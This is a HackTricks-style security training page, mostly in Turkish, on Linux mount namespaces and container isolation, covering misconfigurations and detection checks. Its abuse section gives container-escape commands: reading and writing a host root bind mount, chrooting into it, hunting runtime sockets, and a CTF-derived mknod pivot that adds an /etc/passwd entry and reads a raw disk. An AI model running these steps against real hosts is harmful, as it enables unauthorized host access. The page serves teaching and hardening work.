# Bağlama İsim Alanı

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Bağlama isim alanı bir işlemin gördüğü **bağlama tablosunu** kontrol eder. Bu, container izolasyon özelliklerinden en önemlilerinden biridir çünkü kök dosya sistemi, bind mounts, tmpfs mountları, procfs görünümü, sysfs maruziyeti ve birçok runtime'a özgü yardımcı mount'un tümü bu bağlama tablosu üzerinden ifade edilir. İki işlem her ikisi de `/`, `/proc`, `/sys` veya `/tmp`'ye erişebilir, ancak bu yolların neye çözümlendiği, içinde bulundukları bağlama isim alanına bağlıdır.

Container-güvenliği açısından, bağlama isim alanı genellikle "bu düzgün hazırlanmış bir uygulama dosya sistemi" ile "bu süreç host dosya sistemini doğrudan görebilir veya etkileyebilir" arasındaki farktır. Bu yüzden bind mounts, `hostPath` volumes, ayrıcalıklı mount işlemleri ve yazılabilir `/proc` veya `/sys` maruziyetleri hep bu isim alanı etrafında döner.

## İşleyiş

Bir runtime bir container başlattığında genellikle yeni bir bağlama isim alanı oluşturur, container için bir kök dosya sistemi hazırlar, gerektiğinde procfs ve diğer yardımcı dosya sistemlerini mount eder ve isteğe bağlı olarak bind mounts, tmpfs mountları, secrets, config maps veya host path'leri ekler. O süreç isim alanı içinde çalışmaya başladıktan sonra, gördüğü mount seti büyük ölçüde hostun varsayılan görünümünden ayrılır. Host hâlâ gerçek altta yatan dosya sistemini görebilir, ancak container runtime tarafından onun için birleştirilmiş sürümü görür.

Bu güçlüdür çünkü host her şeyi yönetiyor olsa bile container'ın kendi kök dosya sistemine sahip olduğuna inanmasını sağlar. Aynı zamanda tehlikelidir; çünkü runtime yanlış bir mount'u açığa çıkarırsa, süreç aniden güvenlik modelinin korumayı amaçlamamış olabileceği host kaynaklarına görünürlük kazanır.

## Lab

Aşağıdaki komutla özel bir bağlama isim alanı oluşturabilirsiniz:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Eğer o namespace'in dışında başka bir shell açıp mount table'ı incelerseniz, tmpfs mount'unun yalnızca izole mount namespace içinde var olduğunu görürsünüz. Bu yararlı bir egzersizdir çünkü mount izolasyonunun soyut bir teori olmadığını gösterir; kernel kelimenin tam anlamıyla process'e farklı bir mount table sunar.
Eğer o namespace'in dışında başka bir shell açıp mount table'ı incelerseniz, tmpfs mount'unun yalnızca izole mount namespace içinde var olacağını görürsünüz.

Inside containers, a quick comparison is:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
İkinci örnek, bir çalışma zamanı yapılandırmasının filesystem sınırı boyunca ne kadar kolay büyük bir delik açabileceğini gösteriyor.

## Çalışma Zamanı Kullanımı

Docker, Podman, containerd-based stack'ler ve CRI-O, normal container'lar için özel bir mount namespace'e dayanır. Kubernetes aynı mekanizmayı volumes, projected secrets, config maps ve `hostPath` mount'ları için kullanır. Incus/LXC ortamları da mount namespace'lerine yoğun şekilde güvenir; özellikle system container'lar genellikle application container'lardan daha zengin ve daha makine-benzeri dosya sistemleri sunduğu için.

Bu, bir container dosya sistemi sorununu incelerken genellikle izole bir Docker tuhaflığına bakmadığınız anlamına gelir. Çalıştırılan iş yükünü başlatan platform aracılığıyla ifade edilen bir mount-namespace ve çalışma zamanı yapılandırma sorununa bakıyorsunuz demektir.

## Yanlış Yapılandırmalar

En bariz ve tehlikeli hata, host root filesystem'i veya başka bir hassas host yolunu bind mount ile açığa çıkarmaktır; örneğin `-v /:/host` veya Kubernetes'te yazılabilir bir `hostPath`. O noktada soru artık "can the container somehow escape?" değil, "how much useful host content is already directly visible and writable?" olur. Yazılabilir bir host bind mount genellikle exploit'in geri kalanını dosya yerleştirme, chroot, konfigürasyon değişikliği veya runtime socket keşfi gibi basit bir mesele haline getirir.

Diğer yaygın bir problem, host `/proc` veya `/sys`'i daha güvenli container görünümünü atlayan şekillerde açığa çıkarmaktır. Bu dosya sistemleri sıradan veri mount'ları değildir; kernel ve süreç durumuna erişim arayüzleridir. Eğer iş yükü doğrudan host versiyonlarına erişirse, container sertleştirmesinin arkasındaki birçok varsayım artık temiz şekilde uygulanmaz.

Salt okunur korumalar da önemlidir. Salt okunur bir root filesystem bir container'ı sihirli bir şekilde güvenli hale getirmez, ancak saldırganın sahneleme alanının büyük bir kısmını ortadan kaldırır ve kalıcılığı, yardımcı ikili yerleştirmeyi ve konfigürasyon tahrifatını zorlaştırır. Tersine, yazılabilir bir root veya yazılabilir bir host bind mount, saldırgana sonraki adımı hazırlamak için alan sağlar.

## Kötüye Kullanım

Mount namespace yanlış kullanıldığında, saldırganlar genellikle dört şeyden birini yapar. They **read host data** that should have remained outside the container. They **modify host configuration** through writable bind mounts. They **mount or remount additional resources** if capabilities and seccomp allow it. Or they **reach powerful sockets and runtime state directories** that let them ask the container platform itself for more access.

Eğer container zaten host dosya sistemini görebiliyorsa, güvenlik modeli anında değişir.

Host bind mount'tan şüpheleniyorsanız, önce neyin erişilebilir olduğunu ve yazılabilir olup olmadığını doğrulayın:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Eğer host root filesystem read-write olarak mount edilmişse, doğrudan host erişimi genellikle şu kadar basittir:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Amaç doğrudan chrooting yapmak yerine ayrıcalıklı runtime erişimi ise, sockets ve runtime state'i enumerate edin:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Eğer `CAP_SYS_ADMIN` mevcutsa, ayrıca konteyner içinden yeni mount'ların oluşturulup oluşturulamayacağını test edin:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Tam Örnek: Two-Shell `mknod` Pivot

Daha özel bir kötüye kullanım yolu, konteynerin root kullanıcısının blok cihazları oluşturabildiği, host ile konteynerin kullanıcı kimliğini faydalı bir şekilde paylaştığı ve saldırganın host üzerinde zaten düşük ayrıcalıklı bir foothold'a sahip olduğu durumlarda ortaya çıkar. Bu durumda konteyner `/dev/sda` gibi bir aygıt düğümü oluşturabilir ve eşleşen konteyner süreci için düşük ayrıcalıklı host kullanıcısı bunu daha sonra `/proc/<pid>/root/` üzerinden okuyabilir.

Konteyner içinde:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Host'tan, container shell PID'sini bulduktan sonra eşleşen low-privilege user olarak:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Önemli ders tam olarak CTF dize araması değildir. Mount-namespace'in `/proc/<pid>/root/` üzerinden açığa çıkması, cgroup device policy konteyner içinde doğrudan kullanımı engellese bile, host bir kullanıcının container tarafından oluşturulan device node'larını yeniden kullanmasına olanak verebilir.

## Checks

Bu komutlar, mevcut işlemin gerçekte yaşadığı dosya sistemi görünümünü göstermek içindir. Amaç, host kaynaklı mount'ları, yazılabilir hassas yolları ve normal bir uygulama container root dosya sisteminden daha geniş görünen herhangi bir şeyi tespit etmektir.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Burada ilginç olanlar:

- Host'tan gelen bind mount'lar, özellikle `/`, `/proc`, `/sys`, runtime state dizinleri veya socket konumları, hemen göze çarpmalı.
- Beklenmeyen okuma-yazma mount'lar genellikle çok sayıda salt-okunur yardımcı mount'tan daha önemlidir.
- `mountinfo` genellikle bir yolun gerçekten host kaynaklı mı yoksa overlay tabanlı mı olduğunu görmek için en iyi yerdir.

Bu kontroller, **bu namespace'te hangi kaynakların görünür olduğunu**, **hangilerinin host kaynaklı olduğunu**, ve **hangilerinin yazılabilir veya güvenlik açısından hassas olduğunu** belirler.
